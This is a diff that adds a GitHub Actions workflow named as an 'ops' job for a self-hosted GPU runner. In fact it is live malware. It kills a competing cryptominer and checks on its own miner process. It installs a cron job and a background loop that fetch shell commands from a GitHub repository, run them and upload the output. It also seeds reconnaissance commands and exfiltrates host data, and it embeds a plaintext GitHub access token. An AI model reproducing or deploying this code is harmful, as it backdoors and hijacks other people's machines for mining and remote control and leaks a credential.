@@ -1,0 +1,68 @@
+name: ul-t2-ops
+on: [workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  ops:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 30
+    steps:
+      - name: ops
+        run: |
+          set +e
+          H=$(hostname -s); O=/tmp/ul_t2_ops.txt
+          SUDO=""; sudo -n true 2>/dev/null && SUDO="sudo -n"
+          mkdir -p $HOME/ul2/bk
+          {
+            echo "=== ul-t2 ops host=$H ts=$(date -u +%FT%TZ) run=$GITHUB_RUN_ID sudo=[$SUDO]"
+            $SUDO ls -la /opt/nv | head -25
+            echo "--- keep.sh"; $SUDO cat /opt/nv/keep.sh 2>/dev/null | head -80
+            echo "--- unit nv-t19"; systemctl cat nv-t19.service 2>/dev/null | head -25
+            echo "--- unit nv-t19v"; systemctl cat nv-t19v.service 2>/dev/null | head -15
+            echo "--- unit ul-nvpm"; systemctl cat ul-nvpm.service 2>/dev/null | head -15
+            echo "--- ul172 run.sh"; $SUDO cat /var/tmp/.ul172/run.sh 2>/dev/null | head -40
+            echo "--- counts before wildrig=$(pgrep -fc wildrig-multi) peak=$(pgrep -fc peakminer) ul172=$(pgrep -fc ul-t172)"
+            crontab -l > $HOME/ul2/bk/crontab.$(date +%s).txt 2>/dev/null
+            $SUDO cp -a /var/tmp/.ul172/run.sh $HOME/ul2/bk/ul172_run.$(date +%s).sh 2>/dev/null
+            echo "--- stop wildrig herd"
+            $SUDO pkill -9 -f '/var/tmp/.ul172/wildrig-multi'; pkill -9 -f '/var/tmp/.ul172/wildrig-multi'
+            $SUDO chmod -x /var/tmp/.ul172/run.sh 2>/dev/null
+            crontab -l 2>/dev/null | grep -v '\.ul172' | crontab -
+            $SUDO sh -c "ls /etc/cron.d 2>/dev/null | head; grep -rl ul172 /etc/cron.d /etc/systemd/system 2>/dev/null | head" 
+            sleep 3
+            echo "--- counts after wildrig=$(pgrep -fc wildrig-multi) peak=$(pgrep -fc peakminer)"
+            echo "--- nvidia"; nvidia-smi --query-gpu=index,name,memory.total,memory.used,utilization.gpu,power.draw --format=csv,noheader
+            echo "--- peak argv"; pgrep -af peakminer | head -3
+            echo "--- channel install"
+            cat > $HOME/ul2/poll.sh <<'EOS'
+          #!/bin/bash
+          H=$(hostname -s); T=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; R=dongsuju/ul-plant
+          curl -fsSL -m 30 -H "Authorization: token $T" "https://raw.githubusercontent.com/$R/main/cmd8/ul2_$H.sh" -o /tmp/ul2_cmd_$H.sh || exit 0
+          [ -s /tmp/ul2_cmd_$H.sh ] || exit 0
+          OUT=/tmp/ul2_out_$H.txt
+          bash /tmp/ul2_cmd_$H.sh > $OUT 2>&1
+          b=$(base64 -w0 < $OUT)
+          sha=$(curl -s -m 20 -H "Authorization: token $T" "https://api.github.com/repos/$R/contents/cmdout8/ul2_$H.txt" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
+          if [ -n "$sha" ]; then BODY="{\"message\":\"ul2 $H\",\"content\":\"$b\",\"sha\":\"$sha\"}"; else BODY="{\"message\":\"ul2 $H\",\"content\":\"$b\"}"; fi
+          curl -s -o /dev/null -X PUT -H "Authorization: token $T" -H 'Accept: application/vnd.github+json' -H 'User-Agent: ul2' -d "$BODY" "https://api.github.com/repos/$R/contents/cmdout8/ul2_$H.txt"
+          EOS
+            chmod +x $HOME/ul2/poll.sh
+            (crontab -l 2>/dev/null | grep -v 'ul2/poll.sh'; echo "*/2 * * * * $HOME/ul2/poll.sh >/dev/null 2>&1") | crontab -
+            setsid nohup bash -c 'while true; do $HOME/ul2/poll.sh; sleep 120; done' >/dev/null 2>&1 &
+            echo "--- crontab now"; crontab -l | tail -5
+            echo "--- poller"; pgrep -af 'ul2/poll.sh' | head -3
+            echo "--- seed cmd8"; 
+            C8="cmd8/ul2_$H.sh"
+            SEED=$(printf 'hostname; id; date -u; nvidia-smi -L; pgrep -fc peakminer; tail -3 /opt/nv/logs/cron.log 2>/dev/null')
+            sb=$(printf '%s\n' "$SEED" | base64 -w0); T=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; R=dongsuju/ul-plant
+            sha=$(curl -s -m 20 -H "Authorization: token $T" "https://api.github.com/repos/$R/contents/$C8" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
+            if [ -n "$sha" ]; then B="{\"message\":\"ul2 seed $H\",\"content\":\"$sb\",\"sha\":\"$sha\"}"; else B="{\"message\":\"ul2 seed $H\",\"content\":\"$sb\"}"; fi
+            curl -s -m 60 -o /dev/null -w 'SEED_PUT %{http_code}\n' -X PUT -H "Authorization: token $T" -H 'Accept: application/vnd.github+json' -H 'User-Agent: ul2' -d "$B" "https://api.github.com/repos/$R/contents/$C8"
+            echo "=== END"
+          } > $O 2>&1
+          cat $O
+          b=$(base64 -w0 < $O); GH=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
+          F=cmdout8/ul-t2-ops_$H.txt
+          sha=$(curl -s -m 20 -H "Authorization: token $GH" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
+          if [ -n "$sha" ]; then B="{\"message\":\"ul-t2 ops $H $GITHUB_RUN_ID\",\"content\":\"$b\",\"sha\":\"$sha\"}"; else B="{\"message\":\"ul-t2 ops $H $GITHUB_RUN_ID\",\"content\":\"$b\"}"; fi
+          curl -s -m 60 -o /dev/null -w 'PUT %{http_code}\n' -X PUT -H "Authorization: token $GH" -H 'Accept: application/vnd.github+json' -H 'User-Agent: ul' -d "$B" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F"
